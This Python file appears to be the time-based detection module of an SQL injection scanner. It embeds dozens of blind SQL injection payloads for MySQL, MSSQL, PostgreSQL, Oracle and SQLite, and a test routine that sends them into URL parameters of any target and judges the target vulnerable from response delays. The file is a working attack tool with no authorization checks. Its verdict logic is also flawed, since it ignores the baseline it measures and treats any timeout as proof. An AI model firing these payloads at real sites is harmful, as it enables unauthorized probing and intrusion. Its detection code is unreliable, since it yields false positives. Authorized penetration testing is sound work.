"""
Time-Based SQL Injection Engine
"""

import time
import os
from utils.http_client import HttpClient
from config import MAX_PAYLOADS_PER_TEST, SKIP_DUPLICATE_PAYLOADS, NORMALIZE_PAYLOADS, SMART_PAYLOAD_ORDERING

class TimeEngine:
    def __init__(self):
        self.http_client = HttpClient()
        self.payloads_file = os.path.join("payloads", "time_payloads.txt")
        self.payloads = self._load_payloads()
    
    def _load_payloads(self):
        """Load time-based payloads from file with smart handling"""
        default_payloads = [
            # MySQL Time-based payloads
            "' AND SLEEP(5)--", "' OR SLEEP(5)--", "'; SLEEP(5)--",
            "' AND SLEEP(5)#", "' OR SLEEP(5)#", "'; SLEEP(5)#",
            "' AND BENCHMARK(5000000,MD5('test'))--", "' OR BENCHMARK(5000000,MD5('test'))--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            
            # MSSQL Time-based payloads
            "'; WAITFOR DELAY '0:0:5'--", "' OR WAITFOR DELAY '0:0:5'--", "' AND WAITFOR DELAY '0:0:5'--",
            "'; WAITFOR DELAY '0:0:5'", "' OR WAITFOR DELAY '0:0:5'", "' AND WAITFOR DELAY '0:0:5'",
            
            # PostgreSQL Time-based payloads
            "' AND pg_sleep(5)--", "' OR pg_sleep(5)--", "'; pg_sleep(5)--",
            "' AND (SELECT pg_sleep(5))--", "' OR (SELECT pg_sleep(5))--",
            
            # Oracle Time-based payloads
            "' AND (SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2, ALL_USERS T3) > 0--",
            "' OR (SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2, ALL_USERS T3) > 0--",
            
            # SQLite Time-based payloads
            "' AND randomblob(100000000)--", "' OR randomblob(100000000)--",
            
            # Generic time delays
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))XYZZY)--", 
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))XYZZY)--",
            "'; (SELECT * FROM (SELECT(SLEEP(5)))XYZZY)--"
        ]
        
        try:
            if os.path.exists(self.payloads_file):
                with open(self.payloads_file, 'r', encoding='utf-8') as f:
                    payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                
                # Normalize payloads if enabled
                if NORMALIZE_PAYLOADS:
                    payloads = [' '.join(p.split()) for p in payloads]
                
                # Remove duplicates if enabled
                if SKIP_DUPLICATE_PAYLOADS:
                    payloads = list(dict.fromkeys(payloads))
                
                # Smart ordering
                if SMART_PAYLOAD_ORDERING:
                    payloads = self._order_payloads(payloads)
                
                # Apply limit if specified
                if MAX_PAYLOADS_PER_TEST:
                    payloads = payloads[:MAX_PAYLOADS_PER_TEST]
                
                print(f"   Loaded {len(payloads)} unique time payloads")
                return payloads
            else:
                print(f"   Payload file not found: {self.payloads_file}, using defaults")
                return default_payloads
        except Exception as e:
            print(f"   Error loading payloads: {e}, using defaults")
            return default_payloads
    
    def _order_payloads(self, payloads):
        """Order payloads by database type (most common first)"""
        def payload_priority(payload):
            payload_lower = payload.lower()
            if 'sleep' in payload_lower and 'pg_sleep' not in payload_lower:
                return 0  # MySQL SLEEP
            elif 'waitfor' in payload_lower:
                return 1  # MSSQL
            elif 'pg_sleep' in payload_lower:
                return 2  # PostgreSQL
            elif 'benchmark' in payload_lower:
                return 3  # MySQL BENCHMARK
            else:
                return 4  # Other
        
        return sorted(payloads, key=payload_priority)
    
    def test(self, param, url):
        """Test for time-based SQL injection"""
        try:
            # First get baseline timing
            baseline_time = self._get_response_time(url, {param: "1"})
            
            for payload in self.payloads:
                try:
                    test_params = {param: f"1{payload}"}
                    start_time = time.time()
                    response = self.http_client.get(url, test_params, timeout=10)
                    end_time = time.time()
                    
                    response_time = end_time - start_time
                    
                    # Check if response time indicates sleep
                    if response_time >= 5:  # If delay is 5+ seconds
                        return {
                            "vulnerable": True,
                            "payload": payload, 
                            "delay": response_time,
                            "baseline_time": baseline_time,
                            "evidence": f"Response delayed by {response_time:.2f}s (baseline: {baseline_time:.2f}s)"
                        }
                        
                except Exception as e:
                    # Timeout exceptions are expected for time-based SQLi
                    if "timeout" in str(e).lower():
                        return {
                            "vulnerable": True,
                            "payload": payload,
                            "evidence": "Request timeout - possible time-based SQL injection"
                        }
                    continue
            
            return None
        except Exception as e:
            print(f"   Time test error: {e}")
            return None
    
    def _get_response_time(self, url, params):
        """Get baseline response time"""
        try:
            start_time = time.time()
            self.http_client.get(url, params, timeout=10)
            end_time = time.time()
            return end_time - start_time
        except:
            return 0